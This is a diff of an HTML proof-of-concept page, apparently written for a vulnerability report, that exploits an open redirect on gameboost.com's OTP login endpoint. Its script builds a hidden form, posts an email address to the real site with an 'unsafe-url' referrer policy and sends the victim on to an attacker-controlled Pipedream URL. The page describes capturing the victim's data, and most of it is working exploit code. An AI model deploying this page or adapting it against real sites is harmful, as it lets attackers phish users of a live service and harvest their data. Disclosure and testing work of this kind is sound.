@@ -9,69 +9,58 @@
         .container { background: white; padding: 20px; border-radius: 5px; max-width: 700px; margin: 0 auto; }
         button { background: #d32f2f; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
         button:hover { background: #b71c1c; }
-        .warning { background: #fff3cd; padding: 10px; border-left: 4px solid #ffc107; margin: 10px 0; }
-        .step { background: #e7f3ff; padding: 10px; margin: 10px 0; border-left: 4px solid #0066cc; }
+        .info { background: #e7f3ff; padding: 10px; margin: 10px 0; border-left: 4px solid #0066cc; }
+        code { background: #f0f0f0; padding: 2px 5px; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🔓 Gameboost Open Redirect PoC</h1>
         
-        <div class="warning">
-            <strong>⚠️ ATTACK FLOW:</strong>
-            <div class="step">
-                <strong>Step 1:</strong> Victim visits this attacker page (attacker.com)<br>
-                <strong>Step 2:</strong> Page automatically sends request to gameboost.com/otp/send-login<br>
-                <strong>Step 3:</strong> With malicious Referer header pointing to attacker domain (Pipedream)<br>
-                <strong>Step 4:</strong> Gameboost reflects Referer and redirects to attacker<br>
-                <strong>Step 5:</strong> Victim lands on attacker's Pipedream domain<br>
-                <strong>Step 6:</strong> Attacker captures all victim data
-            </div>
+        <div class="info">
+            <strong>Endpoint:</strong> <code>POST /otp/send-login</code><br>
+            <strong>Vulnerable Header:</strong> <code>Referer</code><br>
+            <strong>Target:</strong> <code>gameboost.com</code><br>
+            <strong>Attacker Domain:</strong> <code>https://eo74rbqu36go8g.m.pipedream.net</code>
         </div>
 
-        <h3>🚀 Victim Page - Click to Simulate Attack:</h3>
-        <button onclick="attackFlow()">▶ START ATTACK - REDIRECT TO GAMEBOOST</button>
+        <h3>Attack Flow:</h3>
+        <p>Victim → This Page → gameboost.com (POST with malicious Referer) → Pipedream</p>
+
+        <button onclick="exploit()">▶ EXECUTE EXPLOIT</button>
         
         <div id="status"></div>
     </div>
 
     <script>
-        function attackFlow() {
+        function exploit() {
             const status = document.getElementById('status');
-            status.innerHTML = '<div style="background: #fff3cd; padding: 10px; border-radius: 4px;"><strong>STEP 1:</strong> Victim on attacker page (this page)</div>';
+            status.innerHTML = '<div style="background: #d4edda; padding: 10px; border-radius: 4px;"><strong>✓ Exploit Triggered!</strong><br>Sending POST request to gameboost.com/otp/send-login with malicious Referer...</div>';
+            
+            // Create form for POST request
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://gameboost.com/otp/send-login';
+            form.referrerPolicy = 'unsafe-url';
+            form.style.display = 'none';
+            
+            // Add email parameter
+            const emailInput = document.createElement('input');
+            emailInput.type = 'hidden';
+            emailInput.name = 'email';
+            emailInput.value = 'mdshakopr@gmail.com';
+            form.appendChild(emailInput);
+            
+            // Add OTP parameter
+            const otpInput = document.createElement('input');
+            otpInput.type = 'hidden';
+            otpInput.name = 'otp';
+            otpInput.value = 'null';
+            form.appendChild(otpInput);
+            
+            document.body.appendChild(form);
             
             setTimeout(() => {
-                status.innerHTML += '<div style="background: #e7f3ff; padding: 10px; border-radius: 4px; margin-top: 5px;"><strong>STEP 2-3:</strong> Sending request to gameboost.com/otp/send-login with malicious Referer...</div>';
-            }, 500);
-            
-            setTimeout(() => {
-                status.innerHTML += '<div style="background: #e7f3ff; padding: 10px; border-radius: 4px; margin-top: 5px;"><strong>STEP 4:</strong> Gameboost server reflects Referer header in redirect response...</div>';
-            }, 1000);
-            
-            setTimeout(() => {
-                status.innerHTML += '<div style="background: #d4edda; padding: 10px; border-radius: 4px; margin-top: 5px;"><strong>STEP 5-6:</strong> Redirecting victim to attacker domain (Pipedream)...</div>';
-            }, 1500);
-            
-            // STEP 1: Victim is here (attacker page)
-            // STEP 2-3: Create form and send to Gameboost with malicious Referer
-            setTimeout(() => {
-                const form = document.createElement('form');
-                form.method = 'GET';
-                form.action = 'https://gameboost.com/otp/send-login';
-                form.referrerPolicy = 'unsafe-url';
-                form.style.display = 'none';
-                
-                const emailInput = document.createElement('input');
-                emailInput.type = 'hidden';
-                emailInput.name = 'email';
-                emailInput.value = 'mdshakopr@gmail.com';
-                form.appendChild(emailInput);
-                
-                document.body.appendChild(form);
-                
-                // STEP 4: Gameboost receives request with Referer: https://eo74rbqu36go8g.m.pipedream.net
-                // STEP 4: Gameboost redirects to Referer header value
-                // STEP 5-6: Victim lands on Pipedream (attacker domain)
                 form.submit();
             }, 2000);
         }
